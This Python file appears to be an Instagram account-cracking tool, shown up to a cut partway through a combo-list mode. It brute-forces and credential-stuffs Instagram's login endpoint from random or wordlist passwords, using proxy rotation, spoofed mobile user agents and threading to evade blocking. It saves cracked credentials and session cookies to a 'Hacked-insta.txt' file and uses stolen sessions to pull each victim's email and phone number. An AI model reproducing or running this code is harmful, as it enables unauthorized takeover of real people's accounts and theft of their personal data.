import os
try:
	import requests,random,threading
	from time import sleep
	from requests import get,post
	from colorama import Fore
except Exception as Joker:exit(Joker)
Blou = Fore.BLUE
red = "\033[1;31;40m";yel = '\033[1;33;40m'
grn = '\033[1;32;40m';wit = "\033[1;37;40m"
errorPas = 'The password you entered is incorrect';login = 'logged_in_user'
errorNam = "Please check your username and try again."
none = 'Invalid Parameters'
band_use = 'inactive user'
secure = 'challenge_required'
withs = 'Please wait a few minutes before you try again';errReq = 'Bad request'
errorFUOt = "We're working on it and we'll get it fixed as soon as we can."
def Exit():exit(0)
class All_Seve:
	def SeveHck(user,pess,coke):
		with open('Hacked-insta.txt', 'a') as J:
			J.write('------\n'+user+':'+pess+'\nCookies:'+coke+'\n')
	def SeveScour(user,pess):
		with open('secure-insta.txt', 'a') as J:
			J.write(user+':'+pess+'\n')
	def SeveBand(user,pess):
		with open('Band-insta.txt', 'a') as J:
			J.write(user+':'+pess+'\n')
def Info_user(user,pess,coke,sisn):
	getn=get('https://www.instagram.com/accounts/edit/?__a=1&__d=dis',headers={'Host': 'www.instagram.com','X-ASBD-ID': '198387','X-Requested-With': 'XMLHttpRequest','X-IG-App-ID': '1217981644879628','Accept-Language': 'ar','Accept': '*/*','User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1','Connection': 'keep-alive','Referer': 'https://www.instagram.com/accounts/edit/','X-IG-WWW-Claim': 'hmac.AR1carwb5gWoeMAlK7PfzBjO790rGGfeGXbhwAUkESygrYzG','Cookie': 'sessionid='+sisn})
	if ('email' in getn.text):
		try:email = getn.json()['form_data']['email']
		except KeyError:email="None"
		try:phone = getn.json()['form_data']['phone_number']
		except KeyError:phone="None"
		threading.Thread(target=All_Seve.SeveHck(user,pess,coke)).start()
	else: threading.Thread(target=All_Seve.SeveHck(user,pess,coke)).start()
uuid = get('https://httpbin.org/uuid')
def User_Agent():
	dpi_phone = [
		'133','320','515','160','640','240','120'
		'800','480','225','768','216','1024']
	model_phone = [
		'Nokia 2.4','HUAWEI','Galaxy',
		'Unlocked Smartphones','Nexus 6P',
		'Mobile Phones','Xiaomi',
		'samsung','OnePlus']
	pxl_phone = [
		'623x1280','700x1245','800x1280',
		'1080x2340','1320x2400','1242x2688']
	i_version = [
		'114.0.0.20.2','114.0.0.38.120',
		'114.0.0.20.70','114.0.0.28.120',
		'114.0.0.0.24','114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)'
	return User_Agent
class hacker_instagram_Check_automatic:
	def __init__(self):
		self.hack=0
		self.ban=0
		self.err=0
		self.prox=0
		self.secur=0
		self.nones=0
		try:self.usL = int(input('[$] Enter the length username [ 2 / 3 / 4 ] : '))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		try:self.modPRX=int(input("""[$] Choose the type of proxy : 
	1-[ http/s ] | 2-[ socks4/5 ]
[$] Enter : """))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		if self.modPRX==1:pass
		elif self.modPRX==2:pass
		else:exit(input('[!] Please enter only one of the numbers written ..'))
		self.pr = input('[$] Enter name file proxy : ')
		try:self.proxy =  open(self.pr,'r').read().splitlines()
		except FileNotFoundError:
			exit(input('\n[-] The file name is incorrect !\n'))
		try:self.trt=int(input('[+] Enter threading : '))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		print('\t\t━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
		self.Trts()
	def Log_user(self):
		lst1 = 'qa2z_wsx3ed.crfv4tg8by1hn5ujmi6klo9p'
		lst2= 'QqAaZzWw!SsXx?EeDdCcRr!FfVvTtGgBb@YyHhNnUuJj$IiKkMmOoLl&Pp12345#6789'
		while True:
			user = str(''.join((random.choice(lst1) for i in range(self.usL))))
			pess=str(''.join((random.choice(lst2) for i in range(8))))
			proxylist = []
			for pro in self.proxy:
				proxylist.append(pro)
				run = str(random.choice(proxylist))
			try:
				if self.modPRX==1:
					PROXY = {
						"http": f"http://{run}",
						"https": f"http://{run}"}
				elif self.modPRX==2:
					PROXY = {
						"socks4": f"socks4://{run}",
						"socks5": f"socks5://{run}"}
				get = post('https://i.instagram.com/api/v1/accounts/login/', headers={'Host':'i.instagram.com','Accept':'*/*','User-Agent': User_Agent(),'Cookie':'missing', 'Accept-Encoding':'gzip, deflate', 'Accept-Language':'en-US', 'X-IG-Capabilities':'3brTvw==','X-IG-Connection-Type':'WIFI', 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', },data={'uuid': uuid.json()['uuid'],'password': pess,'username': user, 'device_id': uuid.json()['uuid'],'from_reg':'false','_csrftoken':'missing', 'login_attempt_countn':'0'}, proxies=PROXY, allow_redirects=True)
				if login in get.text:
					self.hack+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					print(grn+f'[+] Hacked >> {user}:{pess}')
					coke = get.cookies
					try:
						sisn = get.cookies['sessionid']
						threading.Thread(target=Info_user(user,pess,coke,sisn)).start()
					except KeyError:
						threading.Thread(target=All_Seve.SeveHck(user,pess,coke)).start()
				elif errorPas in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif 'unusable_password' in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errorNam in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif band_use in get.text:
					self.ban+=1
					print(yel+f'[-] Account Banned >> {user}:{pess}')
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					threading.Thread(target=All_Seve.SeveBand(user,pess)).start()
				elif secure in get.text:
					self.secur+=1
					print(yel+f'[!] secure >> {user}:{pess}')
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					threading.Thread(target=All_Seve.SeveScour(self.user,pess)).start()
				elif 'ip_block' in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errorFUOt in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif withs in get.text:
					self.prox+1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errReq in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif none in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				else:
					self.nones+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
			except requests.exceptions.ConnectionError:
				self.prox+=1
				print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
			except KeyboardInterrupt:Exit()
			except requests.exceptions.ReadTimeout:
				self.prox+=1
				print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
	def Trts(self):
		theards =[]
		for i in range(self.trt):
			trts = threading.Thread(target=self.Log_user)
			trts.start()
			theards.append(trts)
		for trts2 in theards:
			trts2.join()
class hacker_instagram_randomUser_passLiest:
	def __init__(self):
		self.hack=0
		self.ban=0
		self.err=0
		self.prox=0
		self.secur=0
		self.nones=0
		try:self.usL = int(input('[$] Enter the length username [ 2 / 3 / 4 ] : '))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		self.pes= input('[$] Enter name file password : ')
		try:self.file=open(self.pes,'r')
		except FileNotFoundError:
			exit(input('\n[-] The file name is incorrect !\n'))
		try:self.modPRX=int(input("""[$] Choose the type of proxy : 
	1-[ http/s ] | 2-[ socks4/5 ]
[$] Enter : """))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		if self.modPRX==1:pass
		elif self.modPRX==2:pass
		else:exit(input('[!] Please enter only one of the numbers written ..'))
		self.pr = input('[$] Enter name file proxy : ')
		try:self.proxy =  open(self.pr,'r').read().splitlines()
		except FileNotFoundError:
			exit(input('\n[-] The file name is incorrect !\n'))
		try:self.trt=int(input('[+] Enter threading : '))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		print('\t\t━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
		self.Trts()
	def Log_user(self):
		lst1 = 'qa2z_wsx3ed.crfv4tg8by1hn5ujmi6klo9p'
		while True:
			user = str(''.join((random.choice(lst1) for i in range(self.usL))))
			pess=self.file.readline().split('\n')[0]
			if pess == '':exit(input('over ..'))
			proxylist = []
			for pro in self.proxy:
				proxylist.append(pro)
				run = str(random.choice(proxylist))
			try:
				if self.modPRX==1:
					PROXY = {
						"http": f"http://{run}",
						"https": f"http://{run}"}
				elif self.modPRX==2:
					PROXY = {
						"socks4": f"socks4://{run}",
						"socks5": f"socks5://{run}"}
				get = post('https://i.instagram.com/api/v1/accounts/login/', headers={'Host':'i.instagram.com','Accept':'*/*','User-Agent': User_Agent(),'Cookie':'missing', 'Accept-Encoding':'gzip, deflate', 'Accept-Language':'en-US', 'X-IG-Capabilities':'3brTvw==','X-IG-Connection-Type':'WIFI', 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', },data={'uuid': uuid.json()['uuid'],'password': pess,'username': user, 'device_id': uuid.json()['uuid'],'from_reg':'false','_csrftoken':'missing', 'login_attempt_countn':'0'}, proxies=PROXY, allow_redirects=True)
				if login in get.text:
					print(grn+f'[+] Hacked >> {user}:{pess}')
					self.hack+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					coke = get.cookies
					try:
						sisn = get.cookies['sessionid']
						threading.Thread(target=Info_user(user,pess,coke,sisn)).start()
					except KeyError:
						threading.Thread(target=All_Seve.SeveHck(user,pess,coke)).start()
				elif errorPas in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif 'unusable_password' in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errorNam in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif band_use in get.text:
					self.ban+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					threading.Thread(target=All_Seve.SeveBand(user,pess)).start()
				elif secure in get.text:
					self.secur+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					threading.Thread(target=All_Seve.SeveScour(self.user,pess)).start()
				elif 'ip_block' in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errorFUOt in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif withs in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errReq in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif none in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				else:
					self.nones+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
			except requests.exceptions.ConnectionError:
				self.prox+=1
				print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
			except KeyboardInterrupt:Exit()
			except requests.exceptions.ReadTimeout:
				self.prox+=1
				print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
	def Trts(self):
		theards =[]
		for i in range(self.trt):
			trts = threading.Thread(target=self.Log_user)
			trts.start()
			theards.append(trts)
		for trts2 in theards:
			trts2.join()
class hacker_instagram_1Target_passLiest:
	def __init__(self):
		self.hack=0
		self.ban=0
		self.err=0
		self.prox=0
		self.secur=0
		self.done=0
		self.done2=0
		self.nones=0
		self.user = input('[$] Enter username : ')
		if self.user=='':exit(input('Errors !!'))
		self.pes= input('[$] Enter name file password : ')
		try:self.file=open(self.pes,'r')
		except FileNotFoundError:
			exit(input('\n[-] The file name is incorrect !\n'))
		try:self.modPRX=int(input("""[$] Choose the type of proxy : 
	1-[ http/s ] | 2-[ socks4/5 ]
[$] Enter : """))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		if self.modPRX==1:pass
		elif self.modPRX==2:pass
		else:exit(input('[!] Please enter only one of the numbers written ..'))
		self.pr = input('[$] Enter name file proxy : ')
		try:self.proxy =  open(self.pr,'r').read().splitlines()
		except FileNotFoundError:
			exit(input('\n[-] The file name is incorrect !\n'))
		try:self.trt=int(input('[+] Enter threading : '))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		print('\t\t━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
		self.Trts()
	def Log_user(self):
		while True:
			pess=self.file.readline().split('\n')[0]
			if pess == '':exit(input('over ..'))
			proxylist = []
			for pro in self.proxy:
				proxylist.append(pro)
				run = str(random.choice(proxylist))
			try:
				if self.modPRX==1:
					PROXY = {
						"http": f"http://{run}",
						"https": f"http://{run}"}
				elif self.modPRX==2:
					PROXY = {
						"socks4": f"socks4://{run}",
						"socks5": f"socks5://{run}"}
				get = post('https://i.instagram.com/api/v1/accounts/login/', headers={'Host':'i.instagram.com','Accept':'*/*','User-Agent': User_Agent(),'Cookie':'missing', 'Accept-Encoding':'gzip, deflate', 'Accept-Language':'en-US', 'X-IG-Capabilities':'3brTvw==','X-IG-Connection-Type':'WIFI', 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', },data={'uuid': uuid.json()['uuid'],'password': pess,'username': self.user, 'device_id': uuid.json()['uuid'],'from_reg':'false','_csrftoken':'missing', 'login_attempt_countn':'0'}, proxies=PROXY, allow_redirects=True)
				if login in get.text:
					coke = get.cookies
					print(grn+f'[+] Hacked >> {self.user}:{pess}')
					self.hack+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					try:
						sisn = get.cookies['sessionid']
						while True:
							self.done+=1
							if self.done==1:
								threading.Thread(target=Info_user(self.user,pess,coke,sisn)).start()
								exit(0)
							elif self.done==2:
								threading.Thread(target=Info_user(self.user,pess,coke,sisn)).start()
								exit(0)
							elif self.done==3:Exit()
							else:Exit()
					except KeyError:
						while True:
							self.done2+=1
							if self.done2==1:
								threading.Thread(target=All_Seve.SeveHck(self.user,pess,coke)).start()
								exit(0)
							elif self.done2==2:
								threading.Thread(target=All_Seve.SeveHck(self.user,pess,coke)).start()
								exit(0)
							elif self.done2==3:Exit()
							else:Exit()
				elif errorPas in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif 'unusable_password' in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errorNam in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif band_use in get.text:
					self.ban+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					threading.Thread(target=All_Seve.SeveBand(self.user,pess)).start()
				elif secure in get.text:
					self.secur+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					threading.Thread(target=All_Seve.SeveScour(self.user,pess)).start()
				elif 'ip_block' in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errorFUOt in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif withs in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errReq in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif none in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				else:
					self.nones+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
			except requests.exceptions.ConnectionError:
				self.prox+=1
				print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
			except KeyboardInterrupt:Exit()
			except requests.exceptions.ReadTimeout:
				self.prox+=1
				print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
	def Trts(self):
		theards =[]
		for i in range(self.trt):
			trts = threading.Thread(target=self.Log_user)
			trts.start()
			theards.append(trts)
		for trts2 in theards:
			trts2.join()
class hacker_instagram_Rnadom_username:
	def __init__(self):
		self.hack=0
		self.ban=0
		self.err=0
		self.prox=0
		self.secur=0
		self.nones=0
		self.pess = input('[$] Enter password : ')
		if self.pess=='':exit(input('Errors !!'))
		try:self.usL = int(input('[$] Enter the length username [ 2 / 3 / 4 ] : '))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		try:self.modPRX=int(input("""[$] Choose the type of proxy : 
	1-[ http/s ] | 2-[ socks4/5 ]
[$] Enter : """))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		if self.modPRX==1:pass
		elif self.modPRX==2:pass
		else:exit(input('[!] Please enter only one of the numbers written ..'))
		self.pr = input('[$] Enter name file proxy : ')
		try:self.proxy =  open(self.pr,'r').read().splitlines()
		except FileNotFoundError:
			exit(input('\n[-] The file name is incorrect !\n'))
		try:self.trt=int(input('[+] Enter threading : '))
		except ValueError:exit(input('\n [-] Please enter a number, not a letter !\n'))
		print('\t\t━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
		self.Trts()
	def Log_user(self):
		lst1 = 'qa2z_wsx3ed.crfv4tg8by1hn5ujmi6klo9p'
		while True:
			user = str(''.join((random.choice(lst1) for i in range(self.usL))))
			proxylist = []
			for pro in self.proxy:
				proxylist.append(pro)
				run = str(random.choice(proxylist))
			try:
				if self.modPRX==1:
						PROXY = {
							"http": f"http://{run}",
							"https": f"http://{run}"}
				elif self.modPRX==2:
						PROXY = {
							"socks4": f"socks4://{run}",
							"socks5": f"socks5://{run}"}
				get = post('https://i.instagram.com/api/v1/accounts/login/', headers={'Host':'i.instagram.com','Accept':'*/*','User-Agent': User_Agent(),'Cookie':'missing', 'Accept-Encoding':'gzip, deflate', 'Accept-Language':'en-US', 'X-IG-Capabilities':'3brTvw==','X-IG-Connection-Type':'WIFI', 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', },data={'uuid': uuid.json()['uuid'],'password': self.pess,'username': user, 'device_id': uuid.json()['uuid'],'from_reg':'false','_csrftoken':'missing', 'login_attempt_countn':'0'}, proxies=PROXY, allow_redirects=True)
				if login in get.text:
					self.hack
					print(grn+f'[+] Hacked >> {user}:{self.pess}')
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					coke = get.cookies
					try:
						sisn = get.cookies['sessionid']
						threading.Thread(target=Info_user(user,self.pess,coke,sisn)).start()
					except KeyError:
						threading.Thread(target=All_Seve.SeveHck(user,self.pess,coke)).start()
				elif errorPas in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif 'unusable_password' in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errorNam in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif band_use in get.text:
					self.ban+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					threading.Thread(target=All_Seve.SeveBand(user,self.pess)).start()
				elif secure in get.text:
					self.secur+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
					threading.Thread(target=All_Seve.SeveScour(user,self.pess)).start()
				elif 'ip_block' in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errorFUOt in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif withs in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif errReq in get.text:
					self.prox+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				elif none in get.text:
					self.err+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
				else: 
					self.nones+=1
					print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
			except requests.exceptions.ConnectionError:
				self.prox+=1
				print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
			except KeyboardInterrupt:Exit()
			except requests.exceptions.ReadTimeout:
				self.prox+=1
				print(f'\r[$] {grn}Hacked:[{self.hack}]{wit} | Secure:[{self.secur}] | {yel}band:[{self.ban}]{wit} | {red}Errors:[{self.err}]{wit} | Proxyies:[{self.prox}] | None:[{self.nones}]\r',end="")
	def Trts(self):
		theards =[]
		for i in range(self.trt):
			trts = threading.Thread(target=self.Log_user)
			trts.start()
			theards.append(trts)
		for trts2 in theards:
			trts2.join()
class hacker_instagram_ComboList:
	def __init__(self):
		self.hack=0
		self.ban=0
		self.err=0
		self.prox=0
		self.secur=0
		self.nones=0
		self.c = input('[$] Enter name file combo : ')
		try:self.file = open(self.c, 'r')
		except FileNotFoundError:
